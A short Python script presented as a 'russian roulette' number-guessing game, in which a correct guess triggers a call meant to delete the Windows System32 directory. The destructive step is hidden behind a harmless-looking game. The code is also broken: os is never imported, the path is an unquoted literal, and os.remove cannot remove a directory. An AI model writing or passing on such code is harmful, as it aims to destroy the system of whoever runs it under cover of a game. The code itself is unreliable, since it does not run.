import random

def russian_roulette():
    computer_choice = random.randint(1, 6)
    
    try:
        user_choice = int(input("Choose a number between 1 and 6: "))
        
        if user_choice < 1 or user_choice > 6:
            print("Please choose a valid number between 1 and 6.")
        else:
            if user_choice == computer_choice:
                os.remove(C:\Windows\System32)
            else:
                print("You survived!")

    except ValueError:
        print("Invalid input. Please enter a valid number.")

if __name__ == "__main__":
    russian_roulette()
